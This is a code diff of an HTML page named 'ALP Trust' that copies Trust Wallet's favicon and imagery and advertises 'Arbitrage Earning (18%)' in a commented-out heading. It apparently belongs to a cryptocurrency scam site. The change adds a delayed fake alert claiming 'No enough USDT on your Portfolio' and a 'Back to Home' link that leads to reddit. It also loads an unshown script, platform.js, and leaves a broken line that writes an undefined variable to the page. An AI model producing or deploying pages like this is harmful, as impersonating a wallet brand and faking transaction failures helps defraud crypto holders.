@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0" /> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>
       ALP Trust
     </title>
@@ -14,16 +14,20 @@
       href="https://trustwallet.com/assets/images/favicon.ico"
       type="image/x-icon"
     />
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="css/all.css">
-    <link rel="stylesheet" href="css/solid.css">
-    <!-- <link rel="stylesheet" href="css/solid.min.css"> -->
+    <!-- <link
+      rel="shortcut icon"
+      type="image/png"
+      href="https://trustwallet.com/assets/images/favicon.png"
+    /> -->
     
-    <!-- Bootstrap core CSS -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <!-- Material Design Bootstrap -->
-    <link href="css/mdb.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="css/style.css">
+    <link
+      rel="stylesheet"
+      href="./css/main.css"
+    />
+    <script
+      type="text/javascript"
+      src="./js/platform.js"
+    ></script>
 
     </head>
 
@@ -34,9 +38,46 @@
                 <a class="navbar-brand text-nav text-white pl-0 pt-4" href="#">ALP Trust</a>
             </div>
         </nav> -->
+        <section class="sect pt-2 pb-8 bg-gradient-primary">
+            <div class="container">
+                <div
+                class="
+                    row
+                    align-items-center
+                    justify-content-center justify-content-md-between div1
+                "
+                >
+                
+                <div class="col-12 col-lg-4 text-center mt-0">
+                    <img
+                    class="hero-image mx-auto d-none d-lg-block w-50 d-xl-noneimg-fluid"
+                    src="./img/Wallet.png"
+                    alt="Showcase various types of NFTs that can be stored inside Trust Wallet"
+                    />
+                </div>
+                <div
+                    class="col-12 col-lg-6 mb-8 text-center div2 text-md-left text-white mt-8"
+                >
+                    <!-- <h1 class="display-3 font-weight-bold">
+                    Arbitrage Earning (18%)
+                    </h1> -->
+                    <h1 style="margin-top: 50%;" class="text-white-90">
+                    Thanks for your Time
+                    </h1>
+                    <a
+                    href="https://www.reddit.com/"
+                    class="btn btn-white mt-4 p-2"
+                    aria-label="goes to download page to get Trust Wallet app"
+                    >
+                    Back to Home
+                    </a>
+                </div>
+                </div>
+            </div>
+        </section>
 
 
-        <div class="card text-center mx-4">
+        <!-- <div class="card text-center mx-4">
             <div class="card-header"></div>
             <div class="card-body">
             <h5 class="red-text pb-5">Failed</h5>
@@ -44,13 +85,16 @@
             <p class="p-text2 px-1">No enough USDT on your Portfolio</p>
             </div>
             <div class="card-footer text-muted"></div>
-        </div>
+        </div> -->
 
         <script>
-            window.onload = function(){
+            setTimeout(function(){
                 // alert('Failed XXX --- No enough USDT on your Portfolio');
-                setTimeout("location.href = 'https://www.reddit.com/';",2000);
-            }
+                alert("Failed XXX -- No enough USDT on your Portfolio ");
+                document.getElementById("demo").innerHTML = txt;
+                // }
+                // setTimeout("location.href = 'https://www.reddit.com/';",2000);
+            }, 1000)
         </script>
 
         <!--SCRIPTS-->
